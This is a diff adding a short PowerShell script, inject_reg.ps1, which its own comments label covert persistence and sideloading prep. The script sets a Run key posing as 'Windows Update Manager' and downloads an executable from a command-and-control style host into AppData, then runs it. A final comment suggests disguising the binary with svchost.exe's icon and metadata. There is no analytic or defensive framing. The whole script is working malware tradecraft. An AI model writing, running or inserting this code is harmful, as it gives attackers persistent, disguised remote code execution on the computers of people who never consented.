@@ -1,0 +1,12 @@
+# inject_reg.ps1 - Covert registry + DLL sideloading prep
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+                 -Name "Windows Update Manager" `
+                 -Value "$env:APPDATA\Microsoft\update_agent.exe"
+
+# Drop into AppData
+$dest = "$env:APPDATA\Microsoft\update_agent.exe"
+Invoke-WebRequest -Uri "http://drop.c2/exfil/final_payload.exe" -OutFile $dest
+Start-Process $dest
+
+# Optional: Spoof signed binary via resource patching
+# Use ResHacker or ExeStealth to clone 'svchost.exe' icon & metadata
